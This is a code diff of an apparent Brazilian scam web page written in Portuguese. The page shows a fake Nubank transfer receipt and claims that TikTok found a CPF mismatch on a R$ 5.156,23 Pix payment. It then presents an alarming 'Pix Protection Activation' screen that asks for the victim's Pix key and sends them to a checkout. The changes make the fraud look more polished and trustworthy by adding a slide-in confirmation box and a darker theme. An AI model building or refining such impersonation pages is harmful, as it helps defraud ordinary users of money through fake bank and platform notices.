@@ -29,7 +29,7 @@
 <body>
 
     <!-- ============= STEP 1: TELA ESCURA - SAQUE PROCESSADO ============= -->
-    <div id="step1" class="min-h-screen flex flex-col items-center justify-center px-8 text-center bg-[#121212]">
+    <div id="step1" class="min-h-screen w-full flex flex-col items-center justify-center px-8 text-center bg-[#121212] absolute inset-0 z-50">
 
         <div class="w-24 h-24 bg-white/5 rounded-full flex items-center justify-center mb-8 border border-white/10 shadow-2xl">
             <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="3">
@@ -48,19 +48,19 @@
     </div>
 
     <!-- ============= STEP 2: COMPROVANTE NUBANK ============= -->
-    <div id="step2" class="hidden receipt-container">
+    <div id="step2" class="hidden min-h-screen w-full bg-white relative">
         <!-- Topo Nubank -->
         <div class="flex justify-between items-center px-6 py-6 border-b border-gray-50">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2.5">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2.5" class="cursor-pointer">
                 <path d="M18 6L6 18M6 6l12 12"></path>
             </svg>
             <img src="https://logospng.org/download/nubank/logo-nu-nubank-roxo-icon-1024.png" class="h-8">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#830AD1" stroke-width="2.5">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#830AD1" stroke-width="2.5" class="cursor-pointer">
                 <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8M16 6l-4-4-4 4M12 2v13"></path>
             </svg>
         </div>
 
-        <div class="px-8 pt-10 pb-44">
+        <div class="px-8 pt-10 pb-64">
             <h1 class="text-[24px] font-bold text-[#1a1a1a] mb-10 tracking-tight">Comprovante de transferência</h1>
 
             <div class="mb-10">
@@ -98,8 +98,8 @@
             </div>
         </div>
 
-        <!-- Card flutuante de confirmação -->
-        <div id="confirmBox" class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-100 shadow-2xl px-6 py-8 z-50 max-w-md mx-auto">
+        <!-- Card flutuante de confirmação (com slide de entrada) -->
+        <div id="confirmBox" class="fixed bottom-0 left-0 right-0 bg-white shadow-[0_-15px_50px_rgba(0,0,0,0.18)] px-6 pt-7 pb-12 z-50 max-w-md mx-auto rounded-t-[28px] transform translate-y-full transition-transform duration-500 ease-[cubic-bezier(0.32,1,0.2,1)]">
             <h3 class="text-[20px] font-black mb-2 text-gray-900">Este Pix é seu?</h3>
             <p class="text-gray-500 text-[14px] mb-8 leading-relaxed">
                 O TikTok identificou que os dados da conta de <b>Maria dos Santos Souza</b> não coincidem com o seu CPF. Deseja confirmar este envio de <b>R$ 5.156,23</b>?
@@ -116,34 +116,34 @@
     </div>
 
     <!-- ============= STEP 3: ATIVAÇÃO DE PROTEÇÃO PIX ============= -->
-    <div id="step3" class="hidden bg-[#f8fafc] min-h-screen text-[#121212]">
+    <div id="step3" class="hidden bg-[#121212] min-h-screen text-white">
         <div class="bg-[#CC0000] text-white text-center py-4 px-4 text-[12px] font-black uppercase tracking-tight w-full sticky top-0 z-50">
             ⚠️ ERRO NO PROCESSAMENTO: DIVERGÊNCIA DE DADOS IDENTIFICADA PELO SISTEMA BANCÁRIO
         </div>
 
-        <div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl pb-10">
-            <div class="flex justify-between items-center px-6 py-8 border-b border-gray-100">
+        <div class="max-w-md mx-auto bg-[#121212] min-h-screen pb-10">
+            <div class="flex justify-between items-center px-6 py-8 border-b border-white/5">
                 <div class="flex flex-col">
                     <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo Enviado Errado</span>
-                    <span class="text-4xl font-black text-red-600 tracking-tighter">R$ 5.156,23</span>
+                    <span class="text-5xl font-black text-white tracking-tighter">R$ 5.156,23</span>
                 </div>
             </div>
 
             <div class="px-6 py-10">
                 <div class="text-center mb-10">
                     <div class="text-6xl mb-6">🔒</div>
-                    <h1 class="text-[26px] font-black text-slate-800 mb-2 leading-tight">Ativação de Proteção Pix</h1>
-                    <p class="text-sm font-bold text-red-600 bg-red-50 py-2 px-5 rounded-full inline-block">Erro de titularidade identificado.</p>
+                    <h1 class="text-[26px] font-black text-white mb-2 leading-tight">Ativação de Proteção Pix</h1>
+                    <p class="text-sm font-bold text-red-500 bg-red-950/30 py-2 px-5 rounded-full inline-block border border-red-900/30">Erro de titularidade identificado.</p>
                 </div>
 
-                <div class="bg-gray-50 border-2 border-dashed border-red-200 rounded-[2rem] p-7 mb-10 text-[14px] text-gray-700 leading-relaxed font-medium">
+                <div class="bg-white/5 border-2 border-dashed border-red-900/30 rounded-[2rem] p-7 mb-10 text-[14px] text-gray-300 leading-relaxed font-medium">
                     ⚠️ <b>Atenção:</b> Saques recentes foram revertidos por falha bancária e divergência de chave Pix. O sistema identificou que os dados informados não coincidem com o titular.
                 </div>
 
                 <div class="mb-10 space-y-5">
                     <label class="block text-[11px] font-black text-gray-400 uppercase tracking-widest ml-1">Chave Pix Destino Correta:</label>
                     <input type="text" id="chave-pix-input" placeholder="Digite sua Chave Pix aqui..."
-                           class="w-full p-5 rounded-2xl border-2 border-gray-100 bg-gray-50 text-lg font-bold focus:border-[#FE2C55] focus:outline-none shadow-inner">
+                           class="w-full p-5 rounded-2xl border-2 border-white/10 bg-white/5 text-lg font-bold focus:border-[#FE2C55] focus:outline-none shadow-inner text-white placeholder-gray-500">
                 </div>
 
                 <div class="bg-black rounded-[2rem] p-8 text-white text-center mb-8 pulse-red border-b-8 border-[#FE2C55]">
@@ -154,7 +154,6 @@
 
                 <button onclick="abrirCheckout()" class="block w-full tt-pink text-white text-center py-6 rounded-2xl shadow-xl font-black text-xl uppercase tracking-tight active:scale-95 transition-all">
                     ✅ CONCLUIR COM SEGURANÇA
-                </button>
             </div>
         </div>
     </div>
@@ -426,6 +425,12 @@
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
             window.scrollTo(0, 0);
+            setTimeout(() => {
+                const box = document.getElementById('confirmBox');
+                if (box) {
+                    box.style.transform = 'translateY(0)';
+                }
+            }, 100);
         }
 
         function simEMeu() {
